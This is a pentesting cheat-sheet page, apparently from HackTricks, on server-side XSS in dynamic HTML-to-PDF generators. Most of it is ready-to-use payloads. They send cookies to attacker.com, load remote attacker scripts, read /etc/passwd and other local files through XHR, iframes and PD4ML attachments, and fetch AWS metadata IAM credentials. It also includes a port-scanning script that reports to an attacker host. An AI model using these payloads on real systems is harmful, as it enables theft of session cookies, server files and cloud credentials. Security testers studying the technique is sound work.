# Server Side XSS (Dynamic PDF)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Server Side XSS (Dynamic PDF)

If a web page is creating a PDF using user controlled input, you can try to **trick the bot** that is creating the PDF into **executing arbitrary JS code**.\
So, if the **PDF creator bot finds** some kind of **HTML** **tags**, it is going to **interpret** them, and you can **abuse** this behaviour to cause a **Server XSS**.

Please, notice that the `<script></script>` tags don't work always, so you will need a different method to execute JS (for example, abusing `<img` ).\
Also, note that in a regular exploitation you will be **able to see/download the created pdf**, so you will be able to see everything you **write via JS** (using `document.write()` for example). But, if you **cannot see** the created PDF, you will probably need **extract the information making web request to you** (Blind).

## Payloads

### Discovery

```markup
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```

### SVG

Any of the previous of following payloads may be used inside this SVG payload. One iframe accessing Burpcollab subdomain and another one accessing the metadata endpoint are put as examples.

```markup
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script type="text/javascript">
    // <![CDATA[
      alert(1);
   // ]]>
  </script>
</svg>
```

You can find a lot **other SVG payloads** in [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

### Path disclosure

```markup
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```

### Load an external script

The best conformable way to exploit this vulnerability is to abuse the vulnerability to make the bot load a script you control locally. Then, you will be able to change the payload locally and make the bot load it with the same code every time.

```markup
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```

### Read local file

```markup
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```markup
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.onload = function(){document.write(this.responseText);}
    xhzeem.onerror = function(){document.write('failed!')}
    xhzeem.open("GET","file:///etc/passwd");
    xhzeem.send();
</script>
```

```markup
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
```

```markup
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

### Get external web page response as attachment (metadata endpoints)

```markup
<link rel=attachment href="http://http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

### Bot delay

```markup
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
    let time = 500;
    setInterval(()=>{
        let img = document.createElement("img");
        img.src = `https://attacker.com/ping?time=${time}ms`;
        time += 500;
    }, 500);
</script>
<img src="https://attacker.com/delay">
```

### Port Scan

```markup
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
        let img = document.createElement("img");
        img.src = `http://attacker.com/ping?port=${port}`;
    });
}

for(let i=0; i<1000; i++) {
    checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```

### [SSRF](../ssrf-server-side-request-forgery/)

This vulnerability can be transformed very easily in a SSRF (as you can make the script load external resources). So just try to exploit it (read some metadata?).

### Attachments: PD4ML

There are some HTML 2 PDF engines that allow to **specify attachments for the PDF**, like **PD4ML**. You can abuse this feature to **attach any local file** to the PDF.\
To open the attachment I opened the file with **Firefox and double clicked the Paperclip symbol** to **store the attachment** as a new file.\
Capturing the **PDF response** with burp should also **show the attachment in cleat text** inside the PDF.

{% code overflow="wrap" %}
```html
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
```
{% endcode %}

## References

{% embed url="https://lbherrera.github.io/lab/h1415-ctf-writeup.html" %}

{% embed url="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" %}

{% embed url="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
